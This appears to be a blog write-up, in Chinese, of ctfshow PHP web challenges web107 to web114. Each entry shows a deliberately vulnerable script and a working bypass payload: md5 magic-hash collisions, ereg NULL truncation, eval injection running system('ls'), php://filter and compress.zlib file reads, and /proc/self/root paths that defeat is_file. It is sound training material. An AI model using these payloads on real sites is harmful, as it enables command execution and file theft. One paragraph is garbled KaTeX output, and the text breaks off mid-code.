href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-string-parse-str.html">PHP parse_str() 函数</a></p><p>第二个参数：可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</p><p>利用md5碰撞：使得v1中的flag=0，然后v3=0(md5(QNKCDZO)=0e…)</p><p>payload：<code>vl=flag=0，v3=QNKCDZO)</code></p><p>md5弱碰撞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>e开头的md5和原值：</span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p><p><a href="https://blog.csdn.net/qq_25987491/article/details/79952393">php中ereg函数的截断漏洞</a></p><p><a href="https://www.php.net/strrev">strrev函数</a>：反转字符串</p><p>0x36d=877，因为会被反转所以需要778来提前反转，同时需要截断处理，所以<code>c=a%00778</code>经过反转后取整就是877</p><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为只要有字母就行，所以利用PHP已有的类闭合一下(预防意外的报错导致程序无法正常执行)，然后构造命令执行即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>();<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line">?v1=ReflectionClass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">?v1=<span class="title function_ invoke__">ReflectionClass</span>(<span class="string">&quot;PDO&quot;</span>);<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br></pre></td></tr></table></figure><p><a href="http://blog.uiste.com/2015/20151018-1.html">反射 | PDO</a></p><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>FilesystemIterator获取目录文件<a href="http://phpff.com/filesystemiterator">FilesystemIterator</a></p><p>getcwd()函数取得当前工作目录<a href="https://www.runoob.com/php/func-directory-getcwd.html">getcwd()函数</a></p><p><strong>构造playload：</strong></p><p><code>v1=FilesystemIterator&amp;v2=getcwd</code></p><p>得到当前目录的第一个文件名字：fl36dga.txt，然后访问即可，缺陷：只能获取第一个文件名字</p><p><strong>本地试验例子</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// $iterator = new FilesystemIterator(getcwd());</span></span><br><span class="line"> <span class="comment">// //计算迭代器中元素的个数</span></span><br><span class="line"> <span class="comment">// printf(&quot;There were %d Files&quot;, iterator_count($iterator));</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//php FilesystemIterator 使用 seek 改变指针位置</span></span><br><span class="line"> <span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;../ctfshow&quot;</span>);</span><br><span class="line"> <span class="comment">//php FilesystemIterator 使用 seek 改变指针位置</span></span><br><span class="line"> <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">seek</span>(<span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//使用valid()验证是否存在</span></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">valid</span>()) &#123;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//获取当前指针的第一个文件名</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">getFilename</span>();</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;No file at position 3&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//要遍历当前指针以后的所有文件必须使用while valid()和next()方法，如果使用foreach将会遍历出所有的数据</span></span><br><span class="line"> <span class="keyword">while</span>(<span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">valid</span>()) &#123;</span><br><span class="line">     <span class="title function_ invoke__">var_dump</span>(<span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">getFilename</span>()) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">     <span class="comment">//必须要用next方法改变指针位置</span></span><br><span class="line">     <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">next</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//php FilesystemIterator 使用 valid next 方法遍历元素</span></span><br><span class="line"> <span class="comment">// $iterator = new FilesystemIterator(&quot;../ctfshow&quot;);</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// while($iterator-&gt;valid()) &#123;</span></span><br><span class="line"> <span class="comment">//     var_dump($iterator-&gt;getFilename()) . &quot;\n&quot;;</span></span><br><span class="line"> <span class="comment">//     //必须要用next方法改变指针位置</span></span><br><span class="line"> <span class="comment">//     $iterator-&gt;next();</span></span><br><span class="line"> <span class="comment">// &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;<span class="comment">//规定v1的值</span></span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用全局变量来实现输出</p><p>v1=ctfshow</p><p>v2=GLOBALS</p><p>KaTeX parse error: Expected ‘EOF’, got ‘&amp;’ at position 9: ctfshow=&amp;̲GLOBALS此时c t f s h o w 的 指 向 就 是 全 局 变 量 的 指 向 ， 于 其 具 有 了 相 同 的 作 用 ， 那 么 此 时 v a r d u m p ( ctfshow的指向就是全局变量的指向，于其具有了相同的作用，那么此时var_dump(ctfshow的指向就是全局变量的指向，于其具有了相同的作用，那么此时vard​ump(ctfshow)就是var_dump($GLOBALS)</p><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当看到input和rot13和base64的时候就能想到利用的是伪协议，并且考点是多种读取方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">可以直接用不带任何过滤器的filter伪协议</span><br><span class="line">file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">也可以用一些没有过滤掉的编码方式和转换方式</span><br><span class="line">file=php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">file=compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">↑这是读取压缩流</span><br><span class="line">file=php:<span class="comment">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">↑这是两位一反转的读取方式</span><br></pre></td></tr></table></figure><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>利用上一道题目的payload可以继续打</p><p><code>file=compress.zlib://flag.php</code></p><p>linux里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容<br>多次重复后绕过<code>is_file</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><p>至于为什么需要多次重复来绕过，可能是is_filr函数的特色吧</p><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span 